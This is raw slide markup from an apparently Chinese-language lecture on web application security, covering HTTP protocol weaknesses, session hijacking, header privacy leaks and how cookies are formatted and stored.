              <a:t>通过数据库查询运行优先权命令，查询操纵返回额外的数据集。</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1587">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4515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15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1587">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4515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1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1587">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4515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15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1587">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4515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15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4959" y="1318636"/>
            <a:ext cx="8055696" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用程序功能与安全隐患的对应关系</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170853" y="207386"/>
            <a:ext cx="7793037" cy="958850"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="191366" y="1898073"/>
            <a:ext cx="8315325" cy="472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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>协议是一种简单的、无状态的应用层协议（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC1945</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC2616</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>无状态使攻击变得容易</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>基于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ASCII</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>码，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>无</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>需弄清复杂的二进制编码机制，攻击者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>就</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>可了解协议中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>明文信息</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>互联网中存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>大量中间盒子，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>标准</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(RFC 2616</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC 7320)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的理解如果不一致，就有可能导致一些新的攻击发生</a:t>
            </a:r>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75191" y="1238280"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会话经常被劫持</a:t>
            </a:r>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572020" y="1878676"/>
            <a:ext cx="7600950" cy="4979324"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent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75191" y="1238280"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会话头泄露隐私信息</a:t>
            </a:r>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572106" y="1238280"/>
            <a:ext cx="7534275" cy="5238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41940" y="1570789"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中间盒子带来的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题</a:t>
            </a:r>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972502" y="1213138"/>
            <a:ext cx="6772275" cy="49244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900113" y="1628269"/>
            <a:ext cx="6800850" cy="4324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923925" y="1737806"/>
            <a:ext cx="6724650" cy="4105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1042988" y="1594931"/>
            <a:ext cx="6629400" cy="43910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1150938" y="1443325"/>
            <a:ext cx="6850062" cy="46942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1111250" y="1443326"/>
            <a:ext cx="6867525" cy="4619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1014412" y="1304419"/>
            <a:ext cx="6772275" cy="4972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1130300" y="1508413"/>
            <a:ext cx="6829425" cy="46291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847725" y="1294894"/>
            <a:ext cx="6991350" cy="49911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1135063" y="1443326"/>
            <a:ext cx="6819900" cy="45434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5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="962025" y="1443326"/>
            <a:ext cx="6877050" cy="4610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43326"/>
            <a:ext cx="7772400" cy="4694237"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>协议安全问题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1082675" y="1443326"/>
            <a:ext cx="6924675" cy="4762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2667" y="1457180"/>
            <a:ext cx="7772400" cy="4597255"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为什么需要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>解决无状态问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>保存客户服务器之间的一些状态信息</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>是指网站为了辨别用户身份、进行会话跟踪而储存在用户本地终端上的一些数据（通常经过编码），最早由网景公司的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Lou </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Montulli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1993</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>月发明的，后被采纳为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>标准（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC2109</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC2965</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的安全问题</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6522" y="1429471"/>
            <a:ext cx="7772400" cy="4694237"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的生成与维护</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>由服务器端生成，发送给客户端（一般是浏览器），浏览器会将</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的值保存到某个目录下的文本文件内，下次请求同一网站时就发送该</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>给服务器（前提是浏览器设置为启用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器可以利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>存储信息并经常性地维护这些信息，从而判断在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>传输中的状态</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题</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61831" y="1429471"/>
            <a:ext cx="7772400" cy="4694237"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的生成与维护</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>在生成时就会被指定一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Expire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>值，这就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的生存周期</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。到期自动清除</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>如果一台计算机上安装了多个浏览器，每个浏览器都会在各自独立的空间存放</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中的内容大多数经过了编码处理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题</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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的一般格式如下：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>NAME= VALUE; expires= DATE; path= PATH;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>domain= DOMAIN_NAME; secure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>示例</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>autolog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = bWlrzTpteXMxy3IzdA%3D%3D; expires=Sat, 01-Jan-2018 00:00:00 GMT; path=/; domain=victim.com</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题</a:t>
            </a:r>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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中包含了一些敏感信息，如用户名、计算机名、使用的浏览器和曾经访问的网站等，攻击者可以利用它来进行窃密和欺骗攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题</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7666" name="Line 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1553830" y="4011796"/>
            <a:ext cx="6253738" cy="31621"/>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1" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1261728" y="190030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72" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1338692" y="1939988"/>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1</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1777673" name="Line 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1536366" y="2482360"/>
            <a:ext cx="6253738" cy="24365"/>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4" name="Text Box 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2104691" y="1851715"/>
            <a:ext cx="5685413" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="zh-CN"/>
            </a:defPPr>
            <a:lvl1pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr kumimoji="0" sz="3200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用体系结构脆弱性分析</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777675" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="3421583"/>
            <a:ext cx="5702877" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
